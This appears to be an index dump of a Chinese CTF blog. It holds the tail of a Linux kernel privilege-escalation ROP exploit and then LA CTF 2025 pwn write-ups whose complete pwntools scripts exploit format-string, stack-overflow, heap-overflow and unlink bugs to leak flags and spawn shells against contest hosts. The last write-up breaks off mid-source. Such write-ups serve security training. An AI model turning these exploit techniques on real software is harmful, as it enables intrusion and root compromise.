stbase(0xffffffff813f9ede);// mov rdi, rax ; pop rbp ; mov rax, rdi ; pop r12 ; ret    lss(\"kernel_base\", kernel_base);    //_exit(0);    int i = 8;    rop[i++] = buf[0];    rop[i++] = 0;    rop[i++] = pop_rdi;    rop[i++] = 0;    rop[i++] = prepare_cred;    rop[i++] = mov;    rop[i++] = 0;    rop[i++] = 0;    rop[i++] = commit_creds;    rop[i++] = kernel_base + stbase(0xffffffff81a008f0);    rop[i++] = 0;    rop[i++] = 0;    rop[i++] = (size_t)&amp;get_root_shell;    rop[i++] = user_cs;    rop[i++] = user_rflags;    rop[i++] = user_sp;    rop[i++] = user_ss;    write(fd,(char *)rop,0x200);    ioctl(fd,0x6677889A,(char *)0xffffffffFFFF0100);}extern void _start(){    size_t env[0];    environ = (size_t)&amp;env[4];    doMain();    syscall64(60,0);}‍‍‍参考文章‍https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/https://blog.csdn.net/qq_61670993/category_12450293_2.html‍END"
  },
  
  {
    "title": "LA CTF 2025 部分Pwn解题思路 by g1P03n",
    "url": "/posts/LA_CTF-%E9%83%A8%E5%88%86Pwn%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-by-g1P03n/",
    "categories": "",
    "tags": "",
    "date": "2025-02-02 00:00:00 +0800",
    





    
    "snippet": "‍‍‍2password  题目源码#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;void readline(char *buf, size_t size, FILE *file) {  if (!fgets(buf, size, file)) {    puts(\"wtf\");    ex...",
    "content": "‍‍‍2password  题目源码#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;void readline(char *buf, size_t size, FILE *file) {  if (!fgets(buf, size, file)) {    puts(\"wtf\");    exit(1);  }  char *end = strchr(buf, '\\n');  if (end) {    *end = '\\0';  }}int main(void) {  setbuf(stdout, NULL);  printf(\"Enter username: \");  char username[42];  readline(username, sizeof username, stdin);  printf(\"Enter password1: \");  char password1[42];  readline(password1, sizeof password1, stdin);  printf(\"Enter password2: \");  char password2[42];  readline(password2, sizeof password2, stdin);  FILE *flag_file = fopen(\"flag.txt\", \"r\");  if (!flag_file) {    puts(\"can't open flag\");    exit(1);  }  char flag[42];  readline(flag, sizeof flag, flag_file);  if (strcmp(username, \"kaiphait\") == 0 &amp;&amp;      strcmp(password1, \"correct horse battery staple\") == 0 &amp;&amp;      strcmp(password2, flag) == 0) {    puts(\"Access granted\");  } else {    printf(\"Incorrect password for user \");    printf(username);    printf(\"\\n\");  }}如果输入的用户名和 kaiphait​ 对不上，就会触发格式字符串漏洞输出 用户名flag 已经被读到stack 上了,利用漏洞 %p 泄露 stack的flag  exploit# imLZH1from pwn import *#from ctypes import CDLL#cdl = CDLL('/lib/x86_64-linux-gnu/libc.so.6')s    = lambda   x : io.send(x)sa   = lambda x,y : io.sendafter(x,y)sl   = lambda   x : io.sendline(x)sla  = lambda x,y : io.sendlineafter(x,y)r    = lambda x   : io.recv(x)ru   = lambda x   : io.recvuntil(x)rl   = lambda     : io.recvline()itr  = lambda     : io.interactive()uu32 = lambda x   : u32(x.ljust(4,b'\\x00'))uu64 = lambda x   : u64(x.ljust(8,b'\\x00'))ls   = lambda x   : log.success(x)lss  = lambda x   : ls('\\033[1;31;40m%s -&gt; 0x%x \\033[0m' % (x, eval(x)))attack = 'chall.lac.tf 31142'.replace(' ',':')binary = './chall'def start(argv=[], *a, **kw):    if args.GDB:return gdb.debug(binary,gdbscript)    if args.TAG:return remote(*args.TAG.split(':'))    if args.REM:return remote(*attack.split(':'))    return process([binary] + argv, *a, **kw)#context(log_level = 'debug')context(binary = binary, log_level = 'debug',terminal='tmux splitw -h -l 170'.split(' '))#libc = context.binary.libc#elf  = ELF(binary)#print(context.binary.libs)#libc = ELF('./libc.so.6')#import socks#context.proxy = (socks.SOCKS5, '192.168.31.251', 10808)gdbscript = '''#continue'''.format(**locals())#io = remote(*attack.split(':'))u = ''.join([f'%{i}$p-' for i in range(6,20)])p = 'correct horse battery staple\\x00'io = start([])#gdb.attach(io)ru(': ')sl(u)ru(': ')sl(p)ru(': ')sl('123')ru('Incorrect password for user ')while(1):    #x =  bytes.fromhex(ru('-')[2:])    x =  bytes.fromhex((ru('-')[2:-1]).decode())[::-1]    print(x.decode(),end='')    #pause()itr()​​‍‍state-change‍  源码#include &lt;stdio.h&gt;#include &lt;string.h&gt;char buf[0x500]; // Wow so usefulint state;char errorMsg[0x70];void win() {    char filebuf[64];    strcpy(filebuf, \"./flag.txt\");    FILE* flagfile = fopen(\"flag.txt\", \"r\");    /* ********** ********** */    // Note this condition in win()    if(state != 0xf1eeee2d) {        puts(\"\\ntoo ded to gib you the flag\");        exit(1);    }    /* ********** ********** */      if (flagfile == NULL) {        puts(errorMsg);    } else {        char buf[256];        fgets(buf, 256, flagfile);        buf[strcspn(buf, \"\\n\")] = '\\0';        puts(\"Here's the flag: \");        puts(buf);    }}void vuln(){    char local_buf[0x20];    puts(\"Hey there, I'm deaddead. Who are you?\");    fgets(local_buf, 0x30, stdin);}int main(){    state = 0xdeaddead;    strcpy(errorMsg, \"Couldn't read flag file. Either create a test flag.txt locally and try connecting to the server to run instead.\");    setbuf(stdin, 0);\tsetbuf(stdout, 0);    vuln();      return 0;}存在溢出和输出flag 的函数， 利用 stack 迁移 把 bss 的 state 值修改如何ret 到 win()​ 即可  exploit# imLZH1from pwn import *#from ctypes import CDLL#cdl = CDLL('/lib/x86_64-linux-gnu/libc.so.6')s    = lambda   x : io.send(x)sa   = lambda x,y : io.sendafter(x,y)sl   = lambda   x : io.sendline(x)sla  = lambda x,y : io.sendlineafter(x,y)r    = lambda x   : io.recv(x)ru   = lambda x   : io.recvuntil(x)rl   = lambda     : io.recvline()itr  = lambda     : io.interactive()uu32 = lambda x   : u32(x.ljust(4,b'\\x00'))uu64 = lambda x   : u64(x.ljust(8,b'\\x00'))ls   = lambda x   : log.success(x)lss  = lambda x   : ls('\\033[1;31;40m%s -&gt; 0x%x \\033[0m' % (x, eval(x)))attack = 'chall.lac.tf 31593'.replace(' ',':')binary = './chall'def start(argv=[], *a, **kw):    if args.GDB:return gdb.debug(binary,gdbscript)    if args.TAG:return remote(*args.TAG.split(':'))    if args.REM:return remote(*attack.split(':'))    return process([binary] + argv, *a, **kw)#context(log_level = 'debug')context(binary = binary, log_level = 'debug',terminal='tmux splitw -h -l 170'.split(' '))#libc = context.binary.libc#elf  = ELF(binary)#print(context.binary.libs)#libc = ELF('./libc.so.6')#import socks#context.proxy = (socks.SOCKS5, '192.168.31.251', 10808)gdbscript = '''#continue'''.format(**locals())#io = remote(*attack.split(':'))io = start([])#gdb.attach(io,gdbscript)pay = b'A' * 0x20 + p64(0x404540+0x18) + p64(0x04012D0)[:-0x1]s(pay)pause()pay = p64(0xF1EEEE2D)*4 + p64(0) + p64(0x04011DA)sl(pay)#pay = flat({#},filler=b'\\x00')itr()​​‍‍gamedev  源码#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;struct Level *start = NULL;struct Level *prev = NULL;struct Level *curr = NULL;struct Level{    struct Level *next[8];    char data[0x20];};int get_num(){    char buf[0x10];    fgets(buf, 0x10, stdin);    return atoi(buf);}void create_level(){    if (prev == curr) {        puts(\"We encourage game creativity so try to mix it up!\");        return;    }    printf(\"Enter level index: \");    int idx = get_num();    if (idx &lt; 0 || idx &gt; 7) {        puts(\"Invalid index.\");        return;    }      struct Level *level = malloc(sizeof(struct Level));    if (level == NULL) {        puts(\"Failed to allocate level.\");        return;    }    level-&gt;data[0] = '\\0';    for (int i = 0; i &lt; 8; i++)        level-&gt;next[i] = NULL;    prev = level;    if (start == NULL)        start = level;    else        curr-&gt;next[idx] = level;}void edit_level(){    if (start == NULL || curr == NULL) {        puts(\"No level to edit.\");        return;    }    if (curr == prev || curr == start) {        puts(\"We encourage game creativity so try to mix it up!\");        return;    }      printf(\"Enter level data: \");    fgets(curr-&gt;data, 0x40, stdin); // 这里存在堆溢出}void test_level(){    if (start == NULL || curr == NULL) {        puts(\"No level to test.\");        return;    }    if (curr == prev || curr == start) {        puts(\"We encourage game creativity so try to mix it up!\");        return;    }      printf(\"Level data: \");    write(1, curr-&gt;data, sizeof(curr-&gt;data));    putchar('\\n');}void explore(){    printf(\"Enter level index: \");    int idx = get_num();    if (idx &lt; 0 || idx &gt; 7) {        puts(\"Invalid index.\");        return;    }    if (curr == NULL) {        puts(\"No level to explore.\");        return;    }      curr = curr-&gt;next[idx];\t// 默认 指针里前七个qword 不可以控制\t// 但是通过edit 的堆溢出 可以 修改到}// 0x5738af850300  0x0000000000000000      0x0000000000000071      ........q....... idx 0// 0x5738af850310  0x0000000000000000      0x0000000000000000      ................// 0x5738af850320  0x0000000000000000      0x0000000000000000      ................// 0x5738af850330  0x0000000000000000      0x0000000000000000      ................// 0x5738af850340  0x0000000000000000      0x0000000000000000      ................// 0x5738af850350  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA// 0x5738af850360  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA// 0x5738af850370  0x4141414141414141      0x0000000000000071      AAAAAAAAq....... idx 1// 0x5738af850380  0x000057388484aff8      0x000000000000000a      ....8W..........// 0x5738af850390  0x0000000000000000      0x0000000000000000      ................// 0x5738af8503a0  0x0000000000000000      0x0000000000000000      ................// 0x5738af8503b0  0x0000000000000000      0x0000000000000000      ................// 0x5738af8503c0  0x0000000000000000      0x0000000000000000      ................// 0x5738af8503d0  0x0000000000000000      0x0000000000000000      ................// 会挂掉，因为 2次 explore(0) 后 curr 会成空// 再次 create_level ... curr-&gt;next[idx] = level; // add(0)// explore(0)// explore(0)// add(1)void reset(){    curr = start;}void menu(){    puts(\"==================\");    puts(\"1. Create level\");    puts(\"2. Edit level\");    puts(\"3. Test level\");    puts(\"4. Explore\");    puts(\"5. Reset\");    puts(\"6. Exit\");    int choice;    printf(\"Choice: \");    choice = get_num();    if (choice &lt; 1 || choice &gt; 6)        return;      switch (choice)    {        case 1:            create_level();            break;        case 2:            edit_level();            break;        case 3:            test_level();            break;        case 4:            explore();            break;        case 5:            reset();            break;        case 6:            exit(0);    }}void init(){    setvbuf(stdout, NULL, _IONBF, 0);    setvbuf(stdin, NULL, _IONBF, 0);    // Add starting level    start = malloc(sizeof(struct Level));    start-&gt;data[0] = '\\0';    for (int i = 0; i &lt; 8; i++)        start-&gt;next[i] = NULL;    curr = start;}int main(){    init();    puts(\"Welcome to the heap-like game engine!\");    printf(\"A welcome gift: %p\\n\", main);    while (1)        menu();    return 0;}  exploit# imLZH1from pwn import *#from ctypes import CDLL#cdl = CDLL('/lib/x86_64-linux-gnu/libc.so.6')s    = lambda   x : io.send(x)sa   = lambda x,y : io.sendafter(x,y)sl   = lambda   x : io.sendline(x)sla  = lambda x,y : io.sendlineafter(x,y)r    = lambda x   : io.recv(x)ru   = lambda x   : io.recvuntil(x)rl   = lambda     : io.recvline()itr  = lambda     : io.interactive()uu32 = lambda x   : u32(x.ljust(4,b'\\x00'))uu64 = lambda x   : u64(x.ljust(8,b'\\x00'))ls   = lambda x   : log.success(x)lss  = lambda x   : ls('\\033[1;31;40m%s -&gt; 0x%x \\033[0m' % (x, eval(x)))attack = 'chall.lac.tf 31338'.replace(' ',':')binary = './chall'def start(argv=[], *a, **kw):    if args.GDB:return gdb.debug(binary,gdbscript)    if args.TAG:return remote(*args.TAG.split(':'))    if args.REM:return remote(*attack.split(':'))    return process([binary] + argv, *a, **kw)#context(log_level = 'debug')context(binary = binary, log_level = 'debug',terminal='tmux splitw -h -l 170'.split(' '))libc = context.binary.libcelf  = ELF(binary)#print(context.binary.libs)#libc = ELF('./libc.so.6')#import socks#context.proxy = (socks.SOCKS5, '192.168.31.251', 10808)gdbscript = '''brva 0x01497#continue'''.format(**locals())#io = remote(*attack.split(':'))io = start([])def add(idx):    ru(': ')    sl('1')    ru(': ')    sl(str(idx))def edit(text):    ru(': ')    sl('2')    ru(': ')    s(text)def test():    ru(': ')    sl('3')    ru(': ')def explore(idx):    ru(': ')    sl('4')    ru(': ')    sl(str(idx))def reset():    ru(': ')    sl('5')ru('A welcome gift: ')elf_base = int(rl(),16) - elf.sym['main']elf.address = elf_baseadd(0)add(1)add(2)add(3)explore(0)pay  = b'A' * 0x28pay += p64(0x71)pay += p64(elf.got['atoi']-0x40)edit(pay+b'\\n')#test()reset()explore(1)lss('elf_base')#reset()explore(0)test()libc_base = uu64(r(8)) - libc.sym['atoi']libc.address = libc_baselss('libc_base')#gdb.attach(io,gdbscript)edit(p64(libc.sym['system'])+b'\\n')sl('/bin/sh\\x00')itr()‍minceraft  源码#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;int read_int() {  int x;  if (scanf(\" %d\", &amp;x) != 1) {    puts(\"wtf\");    exit(1);  }  return x;}int main(void) {  setbuf(stdout, NULL);  while (1) {    puts(\"\\nM I N C E R A F T\\n\");    puts(\"1. Singleplayer\");    puts(\"2. Multiplayer\");    if (read_int() != 1) {      puts(\"who needs friends???\");      exit(1);    }    puts(\"Creating new world\");    puts(\"Enter world name:\");    char world_name[64];    scanf(\" \");    gets(world_name);    puts(\"Select game mode\");    puts(\"1. Survival\");    puts(\"2. Creative\");    if (read_int() != 1) {      puts(\"only noobs play creative smh\");      exit(1);    }    puts(\"Creating new world\");    sleep(1);    puts(\"25%\");    sleep(1);    puts(\"50%\");    sleep(1);    puts(\"75%\");    sleep(1);    puts(\"100%\");    puts(\"\\nYOU DIED\\n\");    puts(\"you got blown up by a creeper :(\");    puts(\"1. Return to main menu\");    puts(\"2. Exit\");    if (read_int() != 1) {      return 0;    }  }}直接gets栈溢出, 由于找不到 pop rdi;ret​, 可以利用read_int 函数 设置 rax 然后 mov rdi,rax;call _puts​ 泄露 libc地址后面就是正常的ret2libc 了ROPgadget --binary ./chall |grep \"pop\"  0x000000000040115b : add byte ptr [rcx], al ; pop rbp ; ret0x0000000000401156 : mov byte ptr [rip + 0x2eeb], 1 ; pop rbp ; ret0x000000000040115d : pop rbp ; ret# .text:0000000000401243                 mov     rdi, rax        ; s# .text:0000000000401246                 call    _puts# .text:000000000040124B                 lea     rax, asc_40207D ; \" \"# .text:0000000000401252                 mov     rdi, rax        ; a1# .text:0000000000401255                 mov     eax, 0# .text:000000000040125A                 call    ___isoc99_scanf# .text:000000000040125F                 lea     rax, [rbp-64]# .text:0000000000401263                 mov     rdi, rax# .text:0000000000401266                 call    _gets‍  exploit# imLZH1from pwn import *#from ctypes import CDLL#cdl = CDLL('/lib/x86_64-linux-gnu/libc.so.6')s    = lambda   x : io.send(x)sa   = lambda x,y : io.sendafter(x,y)sl   = lambda   x : io.sendline(x)sla  = lambda x,y : io.sendlineafter(x,y)r    = lambda x   : io.recv(x)ru   = lambda x   : io.recvuntil(x)rl   = lambda     : io.recvline()itr  = lambda     : io.interactive()uu32 = lambda x   : u32(x.ljust(4,b'\\x00'))uu64 = lambda x   : u64(x.ljust(8,b'\\x00'))ls   = lambda x   : log.success(x)lss  = lambda x   : ls('\\033[1;31;40m%s -&gt; 0x%x \\033[0m' % (x, eval(x)))attack = 'chall.lac.tf 31137'.replace(' ',':')binary = './chall'def start(argv=[], *a, **kw):    if args.GDB:return gdb.debug(binary,gdbscript)    if args.TAG:return remote(*args.TAG.split(':'))    if args.REM:return remote(*attack.split(':'))    return process([binary] + argv, *a, **kw)#context(log_level = 'debug')context(binary = binary, log_level = 'debug',terminal='tmux splitw -h -l 170'.split(' '))libc = context.binary.libcelf  = ELF(binary)#print(context.binary.libs)#libc = ELF('./libc.so.6')#import socks#context.proxy = (socks.SOCKS5, '192.168.31.251', 10808)gdbscript = '''b *0x401388b *0x0401379b *0x0401266#continue'''.format(**locals())#io = remote(*attack.split(':'))io = start([])#gdb.attach(io,gdbscript)ru('2. Multiplayer\\n')sl('1')read = 0x401176t1 = 0x401243bss = (elf.bss()&gt;&gt;0xC&lt;&lt;0xC) + 0x800ru('Enter world name:')pay = b'A' * 0x40 +p64(bss) +p64(0x0401388)+ p64(read) + p64(0x0401243)sl(pay)ru('Creative')sl('1')ru('2. Exit\\n')sl(str(0x404000))pause()sl(str(0x404000))libc_base = uu64(r(6)) - libc.sym['puts']libc.address = libc_basesystem = libc.sym['system']bin_sh = next(libc.search(b'/bin/sh'))poprdi = next(libc.search(asm('pop rdi;ret')))lss('libc_base')pause()pay = b'A' * 0x40 +p64(bss) +p64(poprdi+1)+p64(poprdi) + p64(bin_sh) + p64(system)sl(pay)ru('Creative')sl('1')ru('2. Exit\\n')sl(str(0x404000))#pause()#pay = b'A' * 0x40 +p64(bss) +p64(0x0401388)+ p64(read)#pay = flat({#},filler=b'\\x00')itr()‍library  源码#include &lt;fcntl.h&gt;#include &lt;stdint.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/sendfile.h&gt;#include &lt;unistd.h&gt;int read_int(){\tchar buf[0x10] = {};\tread(0, buf, sizeof(buf)-1);\treturn atoi(buf);}struct Book {\tint id;\tchar name[0x10];\tchar *review;};struct Settings {\tuint64_t id;\tchar profile[0x18];\tchar *card;\tuint16_t comprehension;};#define MAX_BOOKS 64int book_cnt = 0;struct Book *library[MAX_BOOKS];// redundant array of independent settings for security :Pstruct Settings *settings, *rais1, *rais2;void order_book(){\tstruct Book *book = malloc(sizeof(struct Book));\tlibrary[book_cnt] = book;\tbook-&gt;id = book_cnt++;\tprintf(\"ordering book with id: %d\\n\", book-&gt;id);\tbook-&gt;review = 0;\tprintf(\"enter name: \");\tint cnt = read(0, book-&gt;name, 0xf);\tbook-&gt;name[cnt] = 0;\tif (cnt &gt; 0 &amp;&amp; book-&gt;name[cnt-1] == '\\n')\t\tbook-&gt;name[cnt-1] = 0;\tprintf(\"book \\\"%s\\\" successfully ordered :D\\n\", book-&gt;name);}void read_book(){\tprintf(\"enter id: \");\tint id = read_int();\tif (id &lt; 0 || id &gt;= MAX_BOOKS || !library[id]) {\t\tputs(\"invalid book id D:\");\t\treturn;\t}\tstruct Book *book = library[id];\tint fd = open(book-&gt;name, O_RDONLY);\tif (fd &lt; 0) {\t\tprintf(\"the book \\\"%s\\\" does not exist D:\\n\", book-&gt;name);\t\treturn;\t}\tputs(\"watch out, book incoming!\");\tif (*(long*)settings-&gt;profile != 0x1a1) {\t\toff_t off = 0;\t\tsendfile(1, fd, &amp;off, settings-&gt;comprehension);\t} else {\t\tchar *buf = malloc(settings-&gt;comprehension);\t\tint cnt = read(fd, buf, settings-&gt;comprehension);\t\twrite(1, buf, cnt);\t\tfree(buf);\t}\tputs(\"\\nhope you enjoyed the read :D\");}void review_book(){\tprintf(\"enter id: \");\tint id = read_int();\tif (id &lt; 0 || id &gt;= MAX_BOOKS || !library[id]) {\t\tputs(\"invalid book id D:\");\t\treturn;\t}\tstruct Book *book = library[id];\tif (book-&gt;review) {\t\tputs(\"this book has already been reviewed\");\t\tprintf(\"would you like to delete the current review? [Y/n] \");\t\tchar buf[0x10];\t\tread(0, buf, sizeof(buf));\t\tif (buf[0] == 'y' || buf[0] == 'Y') {\t\t\tfree(book-&gt;review);\t\t\tbook-&gt;review = 0;\t\t}\t\treturn;\t}\tprintf(\"enter review length: \");\tint len = read_int();\tif (len &lt; 0 || len &gt; 0x10000) {\t\tputs(\"invalid review length D:\");\t\treturn;\t}\tbook-&gt;review = malloc(len);\tprintf(\"enter review: \");\tbook-&gt;review[read(0, book-&gt;review, len)] = 0; // off by null\tputs(\"successfully reviewed book :D\");}void manage_account(){\tprintf(\"would you like to update your bio? [Y/n] \");\tchar buf[0x10];\tread(0, buf, sizeof(buf));\tif (buf[0] == 'y' || buf[0] == 'Y') {\t\tprintf(\"enter bio: \");\t\tread(0, settings-&gt;profile+8, 0x10);\t}\tprintf(\"would you like to add your library card? [Y/n] \");\tread(0, buf, sizeof(buf));\tif (buf[0] == 'y' || buf[0] == 'Y') {\t\tif (settings-&gt;card) {\t\t\tputs(\"card already added D:\");\t\t\treturn;\t\t}\t\tprintf(\"enter card length: \");\t\tint len = read_int();\t\tif (len &lt; 0 || len &gt; 0x100) {\t\t\tputs(\"invalid card length D:\");\t\t\treturn;\t\t}\t\tsettings-&gt;card = malloc(len);\t\tprintf(\"enter card: \");\t\tread(0, settings-&gt;card, len);\t\tmemcpy(&amp;settings-&gt;id, settings-&gt;card, 0x10); // 伪造size 需要用\t}\tprintf(\"would you like to recover settings through RAIS? [Y/n]\");\tread(0, buf, sizeof(buf));\tif (buf[0] == 'y' || buf[0] == 'Y') {\t\tchar *chunk = malloc(0x69);\t\tsize_t diff1, diff2, diff3;\t\tdiff1 = labs((char*)settings-chunk);\t\tdiff2 = labs((char*)rais1-chunk);\t\tdiff3 = labs((char*)rais2-chunk);\t\tif (diff2 &lt;= diff1 &amp;&amp; diff2 &lt;= diff3)\t\t\tsettings = rais1;\t\telse if (diff3 &lt; diff1 &amp;&amp; diff3 &lt; diff2)\t\t\tsettings = rais2;\t}}int main(){\tsetbuf(stdin, 0);\tsetbuf(stdout, 0);\tsettings = malloc(sizeof(struct Settings));\trais1 = rais2 = settings;\tsettings-&gt;id = 0;\tmemset(settings-&gt;profile, 0, sizeof(settings-&gt;profile));\tsettings-&gt;comprehension = 12;\tputs(\"welcome to the library!\");\tputs(\"here you can use the following commands:\");\tputs(\"\\t1) order a book\");\tputs(\"\\t2) read a book\");\tputs(\"\\t3) review a book\");\tputs(\"\\t4) manage account\");\tfor(;;) {\t\tprintf(\"choice: \");\t\tswitch(read_int()) {\t\tcase 1:\t\t\torder_book();\t\t\tbreak;\t\tcase 2:\t\t\tread_book();\t\t\tbreak;\t\tcase 3:\t\t\treview_book();\t\t\tbreak;\t\tcase 4:\t\t\tmanage_account();\t\t\tbreak;\t\tdefault:\t\t\tputs(\"invalid command number\");\t\t}\t}}  题目本事是提供一个 可以读取文件的操作，但是限制里 读取的长度-- 利用思路review_book() 功能存在 heap 的 off by null 漏洞可以利用 读取 /proc/self/maps 可以泄露elf的地址，利用 unlink 攻击 elfbss 上的 settings 指针既可​​​​unlink 之后 就有了任意读写的能力​​默认只能读0xC 个字节， 利用任意写修改后，发现 flag.txt 读出里一堆没用的东西后面利用任意写 去 伪造IO getshell,发现flag.txt 文件挺大的 flag在文件的最下面‍​​# imLZH1from pwn import *#from ctypes import CDLL#cdl = CDLL('/lib/x86_64-linux-gnu/libc.so.6')s    = lambda   x : io.send(x)sa   = lambda x,y : io.sendafter(x,y)sl   = lambda   x : io.sendline(x)sla  = lambda x,y : io.sendlineafter(x,y)r    = lambda x   : io.recv(x)ru   = lambda x   : io.recvuntil(x)rl   = lambda     : io.recvline()itr  = lambda     : io.interactive()uu32 = lambda x   : u32(x.ljust(4,b'\\x00'))uu64 = lambda x   : u64(x.ljust(8,b'\\x00'))ls   = lambda x   : log.success(x)lss  = lambda x   : ls('\\033[1;31;40m%s -&gt; 0x%x \\033[0m' % (x, eval(x)))attack = 'chall.lac.tf 31174'.replace(' ',':')binary = './library'def start(argv=[], *a, **kw):    if args.GDB:return gdb.debug(binary,gdbscript)    if args.TAG:return remote(*args.TAG.split(':'))    if args.REM:return remote(*attack.split(':'))    return process([binary] + argv, *a, **kw)#context(log_level = 'debug')context(binary = binary, log_level = 'debug',terminal='tmux splitw -h -l 170'.split(' '))libc = context.binary.libcelf  = ELF(binary)#print(context.binary.libs)#libc = ELF('./libc.so.6')#import socks#context.proxy = (socks.SOCKS5, '192.168.31.251', 10808)gdbscript = '''brva 0x014FAbrva 0x01696brva 0x014B9#continue'''.format(**locals())#io = remote(*attack.split(':'))io = start([])def add(text):    ru(': ')    sl('1')    ru('name: ')    sl(text)def read_book(idx):    ru(': ')    sl('2')    ru(': ')    sl(str(idx))def review_book1(idx,size,text):    ru(': ')    sl('3')    ru(': ')    sl(str(idx))    ru('length: ')    sl(str(size))    ru(': ')    s(text)def review_book2(idx):    ru(': ')    sl('3')    ru(': ')    sl(str(idx))    ru('[Y/n] ')    sl('y')def manage(bio='A',size=0xf8,card='BB'):    ru(': ')    sl('4')    ru('[Y/n] ')    sl('Y')    ru('bio: ')    sl(bio)    ru('[Y/n] ')    sl('Y')    ru(': ')    sl(str(size))    ru(': ')    sl(card)    ru('[Y/n]')    sl('N')#add('flag')#review_book1(0,0xd8,'A'*0xd8)#manage(card=p64(0)+p64(0x1A1))#read_book(0)#add('/proc/self/maps')#add('flag.txt')#add('flag2')#review_book1(1,0xd8,'A'*0xd8)#pause()#review_book1(2,0x4f8,'B'*0x60)#pause()#review_book2(1)#pause()#review_book1(1,0xd8,b'\\x00'*0xd0+p64(0x1a0))##review_book1(0,0x38,'c'*0x60)#manage(card=p64(0)+p64(0x1A1))#read_book(0)#ru(b'watch out, book incoming!\\n')##elf_base = int(rl(),16)##target = elf_base + 0x04260##lss('elf_base')#fd = target - 0x18#bk = target - 0x10##pay = p64(fd) + p64(bk)#ru(': ')#sl('4')#ru('[Y/n] ')#sl('Y')#ru('bio: ')#sl(pay)#ru('[Y/n] ')#sl('n')#pause()##gdb.attach(io,gdbscript)#review_book2(2)#read_book(1)add('/proc/self/maps')add('/x')add('/a')review_book1(1,0xd8,'A'*0xd8)pause()review_book1(2,0x4f8,'B'*0x60)pause()review_book2(1)pause()review_book1(1,0xd8,b'\\x00'*0xd0+p64(0x1a0))review_book1(0,0x38,'c'*0x60)manage(card=p64(0)+p64(0x1A1))read_book(0)ru(b'watch out, book incoming!\\n')elf_base = int(rl(),16)target = elf_base + 0x04260lss('elf_base')fd = target - 0x18bk = target - 0x10pay = p64(fd) + p64(bk)ru(': ')sl('4')ru('[Y/n] ')sl('Y')ru('bio: ')sl(pay)ru('[Y/n] ')sl('n')pause()review_book2(2)pause()name = p64(elf_base + 0x04020 - 4)ru(': ')sl('4')ru('[Y/n] ')sl('Y')ru('bio: ')s(name)ru('[Y/n] ')sl('n')ru('[Y/n]')sl('n')read_book(0x3f)ru('the book \"')libc_base = uu64(r(6)) - libc.sym['_IO_2_1_stdout_']libc.address = libc_baselss('libc_base')name1 = p64(elf_base + 0x4068 - 4)#gdb.attach(io,gdbscript)ru(': ')sl('4')ru('[Y/n] ')sl('Y')ru('bio: ')s(name1)ru('[Y/n] ')sl('n')ru('[Y/n]')sl('n')read_book(0x3f)ru('the book \"')heap_base = uu64(r(6))lss('heap_base')add('flag.txt')review_book1(3,0x200,'ty')review_book2(3)target = (heap_base - 0x188) - 0x10ru(': ')sl('4')ru('[Y/n] ')sl('Y')ru('bio: ')s(p64(0)+p64(target))ru('[Y/n] ')sl('n')ru('[Y/n]')sl('n')pause()ru(': ')sl('4')ru('[Y/n] ')sl('Y')ru('bio: ')s(p64(libc.sym['_IO_2_1_stdout_']))ru('[Y/n] ')sl('n')ru('[Y/n]')sl('n')#gdb.attach(io,'brva 0x01719')fake_IO_addr = libc.sym['_IO_2_1_stdout_']pay = flat({    0x00: '  sh;',    0x18: libc.sym['system'],    0x20: fake_IO_addr, # 0x20 &gt; 0x18    0x68: 0,                # rdi  #read fd    0x70: fake_IO_addr,     # rsi  #read buf    0x88: fake_IO_addr + 0x8,     # rdx  #read size    0xa0: fake_IO_addr,    0xa8: libc.sym['read'], # RCE2 ogg    0xd8: libc.sym['_IO_wfile_jumps'] + 0x30 - 0x20,    0xe0: fake_IO_addr,    },filler=b'\\x00')review_book1(3,0x200,pay)#pause()#read_book(1)#manage(bio=pay,card=b'C'*8+p64(0x1A1))###add('flag.txt')#add('flag1.txt')#add('flag2.txt')#review_book1(1,0x68,'A'*0x60)#pause()#review_book1(2,0x4f8,'B'*0x60)#pause()#review_book2(1)#add('/proc/self/fd/3')#ru(b'watch out, book incoming!\\n')#pause()#fd = target#bk = target##pay  = p64(0) + p64(0x61)#pay += p64(fd) + p64(bk)#pay  = pay.ljust(0x60 ,b'\\x00')#pay += p64(0x61)#review_book1(3,0x68,pay)#review_book2(0)#pay = flat({#},filler=b'\\x00')itr()cloud-computing  源码#include &lt;algorithm&gt;#include &lt;cstddef&gt;#include &lt;cstdlib&gt;#include &lt;iostream&gt;#include &lt;memory&gt;#include &lt;stdexcept&gt;#include &lt;string_view&gt;template &lt;typename T&gt; class Cloud {public:  Cloud() : rain(), pre(), sat() {}  Cloud(const Cloud&lt;T&gt; &amp;other) = delete;  Cloud(Cloud&lt;T&gt; &amp;&amp;other)      : rain(other.rain), pre(other.precipitation()), sat(other.saturation()) {    other.rain = nullptr;    other.pre = other.sat = 0;  }  std::size_t precipitation() const { return pre; }  std::size_t saturation() const { return sat; }  void forecast(std::size_t new_sat) {    if (new_sat &gt; saturation()) {      auto new_rain = nucleate(new_sat);      std::uninitialized_move_n(rain, precipitation(), new_rain);      evaporate(rain, precipitation());      rain = new_rain;      sat = new_sat;    }  }  T &amp;operator[](std::size_t altitude) {    if (altitude &lt; precipitation()) {      return rain[altitude];    } else {      throw std::out_of_range(\"ಠ_ಠ\");    }  }  void pour(T drop) {    if (precipitation() == saturation()) {      forecast(std::max(saturation() * 2, 1uz));    }    std::construct_at(rain + precipitation(), std::move(drop));    ++pre;  }  Cloud&lt;T&gt; &amp;operator=(const Cloud&lt;T&gt; &amp;other) = delete;  Cloud&lt;T&gt; &amp;operator=(Cloud&lt;T&gt; &amp;&amp;other) = delete;  ~Cloud() { evaporate(rain, precipitation()); }private:  T *rain;  std::size_t pre, sat;  static T *nucleate(std::size_t volume) {    auto water = std::aligned_alloc(alignof(T), sizeof(T) * volume);    if (!water) {      throw std::runtime_error(\"low humidity\");    }    return static_cast&lt;T *&gt;(water);  }  static void evaporate(T *rain, std::size_t mass) {    std::destroy_n(rain, mass);    std::free(rain);  }};template &lt;typename T&gt; T 